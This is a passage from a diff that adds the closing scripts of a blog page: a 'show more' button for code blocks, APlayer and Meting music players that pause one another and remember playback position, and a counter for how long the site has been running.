+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      const existingBox = codeBlock.querySelector('.code-more-box');
+      if (existingBox) existingBox.remove();
+
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://www.retr0.xyz/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+  
+  initCodeMoreBox();
+  
+  
+  document.addEventListener('pjax:complete', () => {
+    initCodeMoreBox();
+  });
+</script>
+
+
+<script>
+
+
+window.__articlePlayers = window.__articlePlayers || [];
+
+
+
+function getGlobalMetingPlayer() {
+    return window.__globalMetingPlayer || null;
+}
+
+
+
+function pauseGlobalMeting() {
+    const p = getGlobalMetingPlayer();
+    if (p && !p.audio.paused) {
+        p.pause();
+        console.log('[APlayer] Pause global Meting');
+    }
+}
+
+
+
+function pauseArticlePlayers() {
+    window.__articlePlayers.forEach(p => {
+        if (p && !p.audio.paused) {
+            p.pause();
+        }
+    });
+}
+
+
+
+function initAPlayers() {
+    if (typeof APlayer === "undefined") return;
+
+    document.querySelectorAll('.aplayer-article').forEach(el => {
+        if (el.dataset.loaded === "true") return;
+        el.dataset.loaded = "true";
+
+        const ap = new APlayer({
+            container: el,
+            fixed: false,
+            autoplay: false,
+            loop: 'none',
+            order: 'list',
+            preload: 'metadata',
+            volume: 0.7,
+            mutex: false, 
+            audio: [{
+                name: el.dataset.title || 'Unknown',
+                artist: el.dataset.artist || '',
+                url: el.dataset.src,
+                cover: el.dataset.cover || ''
+            }]
+        });
+
+        
+        ap.on('play', () => {
+            
+            pauseGlobalMeting();
+
+            
+            window.__articlePlayers.forEach(other => {
+                if (other !== ap && !other.audio.paused) {
+                    other.pause();
+                }
+            });
+
+    console.log('[APlayer] Switch article track');
+});
+
+
+        window.__articlePlayers.push(ap);
+    });
+}
+
+
+
+function bindMetingMutex() {
+    const p = getGlobalMetingPlayer();
+    if (!p || p.__mutexBound) return;
+
+    p.__mutexBound = true;
+
+    
+    p.on('play', () => {
+        pauseArticlePlayers();
+    });
+
+    console.log('[Meting] Mutex bound');
+}
+
+
+
+function initAllPlayers() {
+    initAPlayers();
+    bindMetingMutex();
+}
+
+
+
+document.addEventListener("DOMContentLoaded", initAllPlayers);
+document.addEventListener("pjax:complete", initAllPlayers);
+</script>
+
+<script>
+
+
+function destroyArticlePlayers() {
+    if (!window.__articlePlayers || window.__articlePlayers.length === 0) return;
+
+    window.__articlePlayers.forEach(ap => {
+        try {
+            if (!ap.audio.paused) {
+                ap.pause();
+            }
+            ap.destroy(); 
+        } catch (e) {
+            console.warn('[APlayer] destroy failed', e);
+        }
+    });
+
+    window.__articlePlayers = [];
+    console.log('[APlayer] Article players destroyed');
+}
+
+
+
+document.addEventListener('pjax:send', () => {
+    destroyArticlePlayers();
+});
+</script>
+
+
+<script>
+let runningTimeTimer = null;
+
+function updateRunningTime() {
+    const el = document.getElementById('runningdays');
+    if (!el) return;
+
+    let start = '2025-10-26 00:00:00'; 
+    start = new Date(start.replace(/-/g, "/"));
+    const now = new Date();
+
+    const diff = Math.floor((now.getTime() - start.getTime()) / 1000);
+
+    const days = Math.floor(diff / (24 * 3600));
+    const hours = Math.floor((diff % (24 * 3600)) / 3600);
+    const minutes = Math.floor((diff % 3600) / 60);
+    const seconds = diff % 60;
+
+    el.textContent =
+        `${days}天${hours}小时${minutes}分钟${seconds}秒`;
+}
+
+function initRunningTime() {
+    
+    updateRunningTime();
+
+    
+    if (runningTimeTimer) {
+        clearInterval(runningTimeTimer);
+    }
+
+    runningTimeTimer = setInterval(updateRunningTime, 1000);
+}
+
+ 
+document.addEventListener('DOMContentLoaded', () => {
+    initRunningTime();
+});
+
+ 
+document.addEventListener('pjax:complete', () => {
+    initRunningTime();
+});
+</script>
+
+
+
+
+
+
+
+
+
+        
+
+
+<meting-js
+  id="14477349320"
+  server="netease"
+  type="playlist"
+  fixed="true"
+  bottom="20px"
+  right="20px"
+  autoplay="false"
+  width="300px"
+  preload="metadata"
+  mutex="false">
+</meting-js>
+
+<script>
+(function () {
+
+  
+  if (window.__global_meting_initialized) return;
+  window.__global_meting_initialized = true;
+
+  const STORAGE_KEY = "playInfo";
+  const PLAYLIST_ID = "14477349320";
+
+  function initGlobalMeting() {
+    const meting = document.querySelector('meting-js');
+    if (!meting) return;
+
+    
+    meting.addEventListener('aplayer-loaded', () => {
+      const ap = meting.aplayer;
+      if (!ap) return;
+
+      
+      window.__globalMetingPlayer = ap;
+      console.log('[Meting] Global APlayer ready');
+
+      bindPlayerEvents(ap);
+      restorePlayState(ap);
+    }, { once: true });
+  }
+
+  function bindPlayerEvents(ap) {
+    
+    const save = () => savePlayState(ap);
+
+    window.addEventListener('beforeunload', save);
+    document.addEventListener('visibilitychange', save);
+
+    
+    ap.on('play', () => {
+      document.dispatchEvent(new CustomEvent('global-player-play'));
+    });
+  }
+
+  function savePlayState(ap) {
+    if (!ap || !ap.list || !ap.audio) return;
+
+    const data = {
+      playlistId: PLAYLIST_ID,
+      index: ap.list.index,
+      currentTime: ap.audio.currentTime,
+      paused: ap.paused
+    };
+
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+  }
+
+  function restorePlayState(ap) {
+    const data = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (!data || data.playlistId !== PLAYLIST_ID) return;
+
+    if (data.index < ap.list.songs.length) {
+      ap.list.switch(data.index);
+      ap.once('canplay', () => {
+        ap.seek(data.currentTime || 0);
+        if (!data.paused) {
+          ap.play().catch(() => {
+            ap.notice("点击继续播放", 3000);
+          });
+        }
+      });
+    }
+  }
+
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGlobalMeting);
+  } else {
+    initGlobalMeting();
+  }
+
+})();
+</script>
+
+    </body>
+</html>
